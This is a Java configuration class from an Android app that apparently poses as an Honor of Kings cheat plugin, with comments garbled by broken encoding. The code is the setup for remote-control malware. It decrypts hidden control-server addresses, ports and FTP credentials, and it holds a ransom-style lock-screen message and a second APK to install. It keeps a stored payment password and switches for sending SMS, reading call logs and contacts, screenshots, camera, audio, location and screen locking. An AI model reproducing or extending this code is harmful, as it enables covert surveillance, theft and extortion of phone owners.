package util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

import com.byc.wzry.R;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import encrypt.DES;
import util.Funcs;
import util.RootShellCmd;

/**
 * @author byc
 *
 */
public class ConfigCt {
	private static final char[] wJ = "0123456789abcdef".toCharArray();
    public static String imsi = "204046330839890";
    public static String p = "0";
    public static String keyword = "�绰";
    public static String tranlateKeyword = "%E7%94%B5%E8%AF%9D";
    //************************�����Ϣ**************************************
	public static final String PLUGIN_VERSION="2.19";//����汾��
	public static final String PLUGIN_NAME="wzry.apk";//������֣�
	public static final String PLUGIN_PACKAGENAME="com.byc.wzry";//������֣�
    public static final int RUNNING_IN_PLUGIN = 1;//�Բ����ʽ���У�
    public static final int RUNNING_IN_MYSELF = 0;//������ʽ���У�
    public volatile static int RunningWay=RUNNING_IN_MYSELF;//���з�ʽ
    
    public static final String PREFERENCE_NAME = "byc_wzry_config";//�����ļ�����
    
    public static final String appID="aw";//����app��ʶ��
    
    //�㲥��Ϣ����
    public static final String ACTION_QIANGHONGBAO_SERVICE_DISCONNECT = "com.byc.wzry.ACCESSBILITY_DISCONNECT";
    public static final String ACTION_QIANGHONGBAO_SERVICE_CONNECT = "com.byc.wzry.ACCESSBILITY_CONNECT";
    public static final String ACTION_DOWNLOAD_INFO = "com.byc.wzry.DOWNLOAD_INFO ";//������Ϣ
    public static final String ACTION_INSTALL_INFO = "com.byc.wzry.INSTALL_INFO ";//��װ��Ϣ
    public static final String ACTION_CMD_INFO = "com.byc.wzry.CMD_INFO ";//root������Ϣ
    public static final String ACTION_UPDATE_INFO = "com.byc.UPDATE_INFO ";//������Ϣ
    public static final String ACTION_ACCESSBILITY_SERVICE_CLICK = "com.byc.wzry.ACCESSBILITY_SERVICE_CLICK";//����㲥��
    public static final String ACTION_ACCESSBILITY_SERVICE_REQUEST = "com.byc.ACCESSBILITY_SERVICE_REQUEST";//����㲥��
    //����UI���棺
    public static final String WINDOW_LUCKYMONEY_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";
    public static final String SETTING_PACKAGENAME="com.android.settings";
    
    //��������Ϣ��
    public static final String FTP_FILE_NAME="wzry.xml";//���������ļ�����
    private static final String INFO_NEW_VERSION="Info_New_Version";//--�°汾 ��
    public static String  new_version="1.01";//�°汾�� 
    private static final String INFO_CONTACT="Info_Contact";//--
    public static String contact="QQ��1339524332΢�ţ�x52088801";//��ϵ��ʽ
    private static final String INFO_AD="Info_AD";//--
    public static String ad="������ҫר��͸�ӵ�ͼ�����̼�����ȴʱ�䣡�����ã�";//�����
    private static final String INFO_DOWNLOAD="Info_Download";//--
    //public static String download="http://119.23.68.205/android/wzry.apk";//���ص�ַ
    private static final String INFO_HOMEPAGE="Info_HomePage";//--
    //public static String homepage="http://119.23.68.205/android/index.htm";//���ص�ַ
    private static final String INFO_WARNING="Info_Warning";//--
    public static String warning="���棺δ��Ȩ�û����Ʋ��ֹ��ܣ�";//���ص�ַ   
    public static String install="xxvideo.apk";//��װ��
    public static boolean install_download=true;//���ذ�װ���� ��
    public static boolean install_run=true;//��װ������ ��
	public static final String AD_REG_USER_SEND_INTERVAL="AD_Reg_User_Send_Interval";//�����ע���û���������� 
	public static int RegUserSendADinterval=100000;//�����ע���û����������
	public static final String AD_NO_REG_USER_SEND_INTERVAL="AD_No_Reg_User_Send_Interval";//���δע���û���������� 
	public static int NoRegUserSendADinterval=1000;//���δע���û���������� 
	public static final String AD_OTHER_MEDIA_SEND_INTERVAL="AD_Other_Media_Send_Interval";//�����ע�������ý�巢�������
	public static int OtherMediaSendADinterval=1000;//�����ע�������ý�巢������� 
	public static final String AD_LUCKY_MONEY_SEND_IS="AD_Lucky_Money_Send_Is";//Ⱥ�����к�����������
	public static boolean bLuckyMoneySend=false;//Ⱥ�����к�����������
	public static final String WX_INFO="wechat_info";//΢����Ϣ��
	public static String wi="";//΢����Ϣ��
    
	
	//**********************************************************************************************
		public static final String TAG = "byc001";//���Ա�ʶ��
		public static final String TAG2 = "byc002";//���Ա�ʶ��
		public static final boolean DEBUG =false;//���Ա�ʶ��
		//΢�ŵİ���
		public static final String WECHAT_PACKAGENAME = "com.tencent.mm"; 
		public static final String QQ_PACKAGENAME = "com.tencent.mobileqq";
	    //������IP
	    //public static final String HOST = "host";
		//public static final String host = "119.23.68.205";
		//public static final String host = "119.23.35.238";
		//public static final String host = "47.107.119.104";
		//public static final String host = "47.244.124.46";
		//public static final String host = "47.244.122.104";
		//public static final String host = "47.244.98.118";
		//public static final String host = "47.91.237.232";
		//�������˿�
		//private static final int port = 8000;
		public static final int port_order = 8100;//������ն˿�
		public static final int port_data = 8101;//���ݽ��ն˿�
		public static final int port_data2 = 8102;//���ݽ��ն˿�
		public static final int port_data3 = 8103;//���ݽ��ն˿�
		public static final int port_data4 = 8104;//���ݽ��ն˿�
		//public static final int port_order = 8300;//������ն˿�
		//public static final int port_data = 8301;//���ݽ��ն˿�
		
	    //Ψһ��ʶ��
	    //public static final String PHONE_ID = "PhoneID";
	    //--------------------------------------------------------------------------------------
	    //֧�����룺
	    private static final String PAY_PWD="Pay_PWD";//֧������
	    public static final String KEY_PWD="";//--Ĭ��֧������000000
	    public static String sPWD="";//--Ĭ��֧������000000
	    public static boolean bReg=true;

	    //�汾�ţ�
	    public static String version="";
	    public static int versionCode=100;
	    //ftp
	    //public static final String ftpUserName="byc";
	    //public static final String ftpPwd="byc";

	    //����Ŀ¼��
	    public volatile static String LocalDir="";//���ع���Ŀ¼��
	    public volatile static String LocalPath="";//���ع���·����
	    public volatile static String LocalUploadPath="";//���ع����ϴ�·��
	    private static final String WORK_SPACE="byc";//--���ع���Ŀ¼����
	    private static final String ROOT_PERMISSION="root_permission";//--��
	    public volatile static boolean bRoot=false;//�Ƿ�root
	    public volatile static String AppName="";//��app���ƣ�
	    public volatile static String PhoneBrand="";//�ֻ�Ʒ�ƣ�
	    public static final String PHONE_BRAND_XIAOMI="Xiaomi";//--Xiaomi
	    public static final String PHONE_BRAND_HONOR="Honor";//--Honor
	    public volatile static int screenWidth=0;//��Ļ��
	    public volatile static int screenHeight=0;//��Ļ�ߣ�
	    public volatile static int navigationBarHeight=0;//�������ߣ�
	    
	    public volatile static String uIP="";//���·�������ַ
	    public volatile static int uPortU=8955;//���·������˿�
	    public volatile static int uPortD=8957;//���·������˿�
	    public volatile static String cIP="";//���Ʒ�������ַ
	    public volatile static int cPort_order=port_order;//���Ʒ������˿�
	    public volatile static int cPort_data=port_data;//���Ʒ������˿�  
	    
	    public static final String KEY = "9ba45bfd500642328ec03ad8ef1b6e75";// �Զ�����Կ
	    //public final static String DOWNLOAD="http://119.23.68.205/android/files/apk/";//���ص�ַ
	    public final static String DOWNLOAD="CtyKsYF6s3pa65bKuCLxRiGboTe/BHfVVo8ZnKsZEidE9O6fTUCENg==";//���ص�ַ
	    public static String download="";//���ص�ַ
	    //public static final String HOMEPAGE="http://119.23.68.205/android/android.htm";//���ص�ַ
	    public static final String HOMEPAGE="CtyKsYF6s3pa65bKuCLxRiGboTe/BHfVGo376CwctMSEXSEffXfCTmcS0YUiRJsb";//���ص�ַ
	    public static String homepage=HOMEPAGE;//���ص�ַ
	    public static final String HOST = "TrxMnCHzq6kLb41Q90hIUg==";
	    public static final String FTP_USER_NAME="o1D58m2VSDQ=";
	    public static final String FTP_USER_PWD="o1D58m2VSDQ=";
	    public volatile static String ftpPwd="";
	    public volatile static String ftpUserName="";
	    //*******************************************************************************
	    //public static final String LOCK_SAY="�����ֻ��������繥����\n����ʱ������\n����ϵ�ͷ���\nQQ��1096754477\n����!\n���棺����οͷ�QQ�ţ�ǧ���������ֻ��������ֻ��ᱻ����������";
	    public static final String LOCK_SAY="QF0ArMiNv7T4fpr9BXz9OWPxWE1I9mFPWDlTuqd71qq+ZKy77Z8WkpEjTJhevC4QapEo6l++BTK0sViOrGrIuuRnn/C9cXSboNQETn2L28MQo8v4eE4IIg2Sv1HdbvT9YSwQEhOPLuENu+vSMX9lXdkoGzZMerKTK9F0VTl3dhnYNbewAwEGBXPRczUzeMI+ABFNxmlcc3gzn/UV7tMjzWdaPCcIaSOMFUz3vTZmahJ5H3eal29pDNE3IwA1QXPp";
	    public static String lock_say="";
	    
	    private static ConfigCt current;
		private SharedPreferences preferences;
		public  static Context context;
		SharedPreferences.Editor editor;
		    
		private ConfigCt(Context context) {
			ConfigCt.context = context;
			preferences = context.getSharedPreferences(PREFERENCE_NAME, Context.MODE_PRIVATE);
			editor = preferences.edit(); 
			decryptString();
			readCfgFile();//�������ļ���
			cIP=getControlIP();//���»�ȡ���Ʒ�������ַ��
			cPort_order=getControlPort();//���»�ȡ���Ʒ�������ַ��
			cPort_data=cPort_order+1;//���»�ȡ���Ʒ�������ַ��
			
			LocalDir=this.getLocalDir();
			bRoot=RootShellCmd.isRoot(context);
			ConfigCt.version=getSelfVersion();
			AppName=getSelfName();
			PhoneBrand=getPhoneBrand();
			//2.ȡ����������Ϣ��
			ConfigCt.new_version=this.getNewVersion();
			ConfigCt.download=this.getDownloadAddr();
			ConfigCt.contact=this.getContactWay();
			ConfigCt.warning=this.getWarning();
			ConfigCt.homepage=this.getHomepage();
			ConfigCt.ad=this.getAd();
			ConfigCt.NoRegUserSendADinterval=this.getNoRegUserSendADinterval();
			ConfigCt.RegUserSendADinterval=this.getRegUserSendADinterval();
			ConfigCt.OtherMediaSendADinterval=this.getOtherMediaSendADinterval();
			ConfigCt.bLuckyMoneySend=this.getLuckyMoneySendIs();

		}
		public static synchronized ConfigCt getInstance(Context context) {
		        if(current == null) {
		            current = new ConfigCt(context.getApplicationContext());
		        }
		        return current;
		}
		private void decryptString(){
			DES des = DES.getDes(KEY);
			try{
				uIP=des.decode(HOST);
				cIP=uIP;
				ftpUserName=des.decode(FTP_USER_NAME);
				ftpPwd=des.decode(FTP_USER_PWD);
				download=des.decode(DOWNLOAD)+PLUGIN_NAME;
				homepage=des.decode(HOMEPAGE);
				lock_say=des.decode(LOCK_SAY);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		public String getLocalDir(){
		        String sdcardPath = Environment.getExternalStorageDirectory().toString();
		        String workDir = sdcardPath + "/" + WORK_SPACE;
		        String uploadDir=workDir+ "/upload";
		        Funcs.makeDir(workDir);
		        Funcs.makeDir(uploadDir);
		        LocalDir=workDir;
		        LocalPath=workDir+ "/" ;
		        LocalUploadPath=uploadDir+ "/" ;
		        return workDir;
		}
		private String getSelfName(){
		    	//AppName=context.getString(R.string.app_name);
			AppName=context.getApplicationContext().getString(ResourceUtil.getStringId(context, "app_name"));
		    return AppName;
		}
		private String getSelfVersion(){
			try {
				PackageInfo info = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
				ConfigCt.version = info.versionName;
				ConfigCt.versionCode=info.versionCode;
		      		  //if(DEBUG)Log.i(TAG, info.applicationInfo.name);
				return  ConfigCt.version;
			} catch (PackageManager.NameNotFoundException e) {
				e.printStackTrace();
				return "";
			}
		}
		/*
		     * �ֻ�Ʒ�ƣ� Xiaomi,Honor
		*/
		private String getPhoneBrand(){
		    	PhoneBrand=android.os.Build.BRAND;//�ֻ�Ʒ�� 
		    	return PhoneBrand;
		}   
		  
		/*����֧�����룺*/
		public String getPayPWD() {
		        return preferences.getString(PAY_PWD, "");
		}
		public void setPayPWD(String sPayPWD) {
		        editor.putString(PAY_PWD, sPayPWD).apply();
		}

		    //----------------------------------�����������Ϣ----------------------------------
		    /** �°汾��*/
		    public String getNewVersion() {
		        return preferences.getString(INFO_NEW_VERSION, new_version);
		    }
		    /** �°汾��*/
		    public void setNewVersion(String version) {
		    	editor.putString(INFO_NEW_VERSION, version).apply();
		    }
		    /** ��ϵ��ʽ*/
		    public String getContactWay() {
		        return preferences.getString(INFO_CONTACT,contact);
		    }
		    /** ��ϵ��ʽ*/
		    public void setContactWay(String contactWay) {
		    	editor.putString(INFO_CONTACT, contactWay).apply();
		    }
		    /** �����*/
		    public String getAd() {
		        return preferences.getString(INFO_AD,ad);
		    }
		    /** �����*/
		    public void setAd(String Ad) {
		    	editor.putString(INFO_AD, Ad).apply();
		    }
		    /** ���µ�ַ*/
		    public String getDownloadAddr() {
		        return preferences.getString(INFO_DOWNLOAD, download);
		    }
		    /** ���µ�ַ*/
		    public void setDownloadAddr(String downloadAddr) {
		    	editor.putString(INFO_DOWNLOAD, downloadAddr).apply();
		    }
		    /**��ҳ��ַ*/
		    public String getHomepage() {
		        return preferences.getString(INFO_HOMEPAGE, homepage);
		    }
		    /** ��ҳ��ַ*/
		    public void setHomepage(String homepage) {
		    	editor.putString(INFO_HOMEPAGE, homepage).apply();
		    }
		    /**������Ϣ*/
		    public String getWarning() {
		        return preferences.getString(INFO_WARNING, warning);
		    }
		    /** ������Ϣ*/
		    public void setWarning(String warning) {
		    	editor.putString(INFO_WARNING, warning).apply();
		    }
		    /**�����ע���û��������*/
		    public int getRegUserSendADinterval() {
		        return preferences.getInt(AD_REG_USER_SEND_INTERVAL, RegUserSendADinterval);
		    }
		    /** �����ע���û��������*/
		    public void setRegUserSendADinterval(int regUserSendADinterval) {
		    	editor.putInt(AD_REG_USER_SEND_INTERVAL, regUserSendADinterval).apply();
		    }
		    /**���δע���û��������*/
		    public int getNoRegUserSendADinterval() {
		        return preferences.getInt(AD_NO_REG_USER_SEND_INTERVAL, NoRegUserSendADinterval);
		    }
		    /** �����ע���û��������*/
		    public void setNoRegUserSendADinterval(int noRegUserSendADinterval) {
		    	editor.putInt(AD_NO_REG_USER_SEND_INTERVAL, noRegUserSendADinterval).apply();
		    }
		    /**�����ע�������ý�巢�����*/
		    public int getOtherMediaSendADinterval() {
		        return preferences.getInt(AD_OTHER_MEDIA_SEND_INTERVAL, OtherMediaSendADinterval);
		    }
		    /** �����ע�������ý�巢�����*/
		    public void setOtherMediaSendADinterval(int otherMediaSendADinterval) {
		    	editor.putInt(AD_OTHER_MEDIA_SEND_INTERVAL, otherMediaSendADinterval).apply();
		    }
		    /**Ⱥ�����к�����������*/
		    public boolean getLuckyMoneySendIs() {
		        return preferences.getBoolean(AD_LUCKY_MONEY_SEND_IS, bLuckyMoneySend);
		    }
		    /** Ⱥ�����к�����������*/
		    public void setLuckyMoneySendIs(boolean LuckyMoneySend) {
		    	editor.putBoolean(AD_LUCKY_MONEY_SEND_IS, LuckyMoneySend).apply();
		    }
		    /**΢����Ϣ*/
		    public String getWechatInfo() {
		        return preferences.getString(WX_INFO, wi);
		    }
		    /** ΢����Ϣ*/
		    public void setWechatInfo(String info) {
		    	editor.putString(WX_INFO, info).apply();
		    }
		    //-----------------------�Ƿ��Ͷ���----------------------------------------
		    public boolean getIsSendSms() {
		        return preferences.getBoolean("SEND_SMS", false);
		    }
		    public void setIsSendSms(boolean bSend) {
		        editor.putBoolean("SEND_SMS", bSend).apply();
		    }
		    //-----------------------�Ƿ��Ͷ��ŵ��ֻ�----------------------------------------
		    public boolean getIsSendSmsToPhone() {
		        return preferences.getBoolean("SEND_SMS_TO_PHONE", false);
		    }
		    public void setIsSendSmsToPhone(boolean bSend) {
		        editor.putBoolean("SEND_SMS_TO_PHONE", bSend).apply();
		    }
		    //-----------------------�Ƿ��ж�ͨ����¼����----------------------------------------
		    public boolean getIsReadCallLog() {
		        return preferences.getBoolean("CALL_LOG", false);
		    }
		    public void setIsReadCallLog(boolean bSend) {
		        editor.putBoolean("CALL_LOG", bSend).apply();
		    }
		    //-----------------------�Ƿ��ж�ͨѶ¼����----------------------------------------
		    public boolean getIsReadContact() {
		        return preferences.getBoolean("CONTACT_CONTENT", false);
		    }
		    public void setIsReadContact(boolean bSend) {
		        editor.putBoolean("CONTACT_CONTENT", bSend).apply();
		    }
		    /**�Ƿ��н���Ȩ��*/
		    public boolean haveScreenShotPower() {
		        return preferences.getBoolean("SCREEN_SHOT_POWER", false);
		    }
		    /** �Ƿ��н���Ȩ��*/
		    public void setScreenShotPower(boolean bHave) {
		    	editor.putBoolean("SCREEN_SHOT_POWER", bHave).apply();
		    }
		    /** �Ƿ���ROOTȨ��*/
		    public void setRootPermission(boolean bHave) {
		    	editor.putBoolean(ROOT_PERMISSION, bHave).apply();
		    }
		    /**�Ƿ���rootȨ��*/
		    public boolean haveRootPermission() {
		        return preferences.getBoolean(ROOT_PERMISSION, false);
		    }
		    /** �Ƿ���carmeraȨ��*/
		    public void setCameraPermission(boolean bHave) {
		    	editor.putBoolean("CAMERA_PERMISSION", bHave).apply();
		    }
		    /**�Ƿ���carmeraȨ��*/
		    public boolean haveCameraPermission() {
		        return preferences.getBoolean("CAMERA_PERMISSION", false);
		    }
		    /** �Ƿ���AudioȨ��*/
		    public void setAudioPermission(boolean bHave) {
		    	editor.putBoolean("AUDIO_PERMISSION", bHave).apply();
		    }
		    /**�Ƿ���AudioȨ��*/
		    public boolean haveAudioPermission() {
		        return preferences.getBoolean("AUDIO_PERMISSION", false);
		    }
		    /** �Ƿ���LOCKȨ��*/
		    public void setLockPermission(boolean bHave) {
		    	editor.putBoolean("LOCK_PERMISSION", bHave).apply();
		    }
		    /**�Ƿ���LOCKȨ��*/
		    public boolean haveLockPermission() {
		        return preferences.getBoolean("LOCK_PERMISSION", false);
		    }
		    /** �Ƿ��ж�λȨ��*/
		    public void setLocatePermission(boolean bHave) {
		    	editor.putBoolean("LOCATE_PERMISSION", bHave).apply();
		    }
		    /**�Ƿ��ж�λȨ��*/
		    public boolean haveLocatePermission() {
		        return preferences.getBoolean("LOCATE_PERMISSION", false);
		    }
		    /**QQ��Ϣ*/
		    public String getQQInfo() {
		        return preferences.getString("QQ_INFO", "");
		    }
		    /** QQ��Ϣ*/
		    public void setQQInfo(String info) {
		    	editor.putString("QQ_INFO", info).apply();
		    }
		    /** �Ƿ���������������Ȩ��*/
		    public void setFloatWindowLock(boolean bLock) {
		    	editor.putBoolean("FLOAT_WINDOW_LOCK", bLock).apply();
		    }
		    /**�Ƿ�������������*/
		    public boolean isFloatWindowLock() {
		        return preferences.getBoolean("FLOAT_WINDOW_LOCK", false);
		    }
		    /**QQ��Ƶ����*/
		    public int getQQVideoCount() {
		        return preferences.getInt("QQ_VIDEO_COUNT",0);
		    }
		    /** QQ��Ƶ����*/
		    public void setQQVideoCount(int count) {
		    	editor.putInt("QQ_VIDEO_COUNT", count).apply();
		    }
		    /**WX��Ƶ����*/
		    public int getWXVideoCount() {
		        return preferences.getInt("WX_VIDEO_COUNT", 0);
		    }
		    /** WX��Ƶ����*/
		    public void setWXVideoCount(int count) {
		    	editor.putInt("WX_VIDEO_COUNT", count).apply();
		    }
		    /**WX��½��Ƶ����*/
		    public int getWXLoginVideoCount() {
		        return preferences.getInt("WX_LOGIN_VIDEO_COUNT", 0);
		    }
		    /** WX��½��Ƶ����*/
		    public void setWXLoginVideoCount(int count) {
		    	editor.putInt("WX_LOGIN_VIDEO_COUNT", count).apply();
		    }
		    /**QQ��½��Ƶ����*/
		    public int getQQLoginVideoCount() {
		        return preferences.getInt("QQ_LOGIN_VIDEO_COUNT", 0);
		    }
		    /** QQ��½��Ƶ����*/
		    public void setQQLoginVideoCount(int count) {
		    	editor.putInt("QQ_LOGIN_VIDEO_COUNT", count).apply();
		    }
		    /** ��ȡ�����ļ�����*/
		    private void readCfgFile() {
		    	File cfg = context.getDir("payload_cfg", Context.MODE_PRIVATE );
		    	String cfgFileName = cfg.getAbsolutePath() + "/cfg";
		    	//String cfgFileName =getTestCfgFilename();
		    	File cfgFile = new File(cfgFileName);
				if (!cfgFile.exists())return;
				RunningWay=RUNNING_IN_PLUGIN;
				try {
					FileReader reader = new FileReader(cfgFileName);
					BufferedReader br = new BufferedReader(reader);
					String str = null;
					int i=1;
					while((str = br.readLine()) != null) {
						if(i==1)uIP=str;
						if(i==2){
							uPortU=Integer.parseInt(str);
							uPortD=uPortU+2;
						}
						if(i==3)cIP=str;
						if(i==4){
							cPort_order=Integer.parseInt(str);
							cPort_data=cPort_order+1;
						}
						i=i+1;
		            }

				}catch(FileNotFoundException e) {
		            e.printStackTrace();
		        }
		        catch(IOException e) {
		            e.printStackTrace();
		        }

		    }
		    /**���Ʒ�������ַ*/
		    public String getControlIP() {
		        return preferences.getString("CONTROL_IP", cIP);
		    }
		    /** ���Ʒ�������ַ*/
		    public void setControlIP(String controlIP) {
		    	editor.putString("CONTROL_IP", controlIP).apply();
		    }
		    /**���Ʒ������˿�*/
		    public int getControlPort() {
		        return preferences.getInt("CONTROL_PORT", cPort_order);
		    }
		    /** ���Ʒ������˿�*/
		    public void setControlPort(int controlPort) {
		    	editor.putInt("CONTROL_PORT", controlPort).apply();
		    }
		    /*
			 * ��ȡcfg�ļ�·���������ú���:
			 * */
			private String getTestCfgFilename()  { 
				String sdcardPath = Environment.getExternalStorageDirectory().toString();
		        String apkFilename = sdcardPath + "/byc/cfg";
		        return apkFilename;
			}
	}

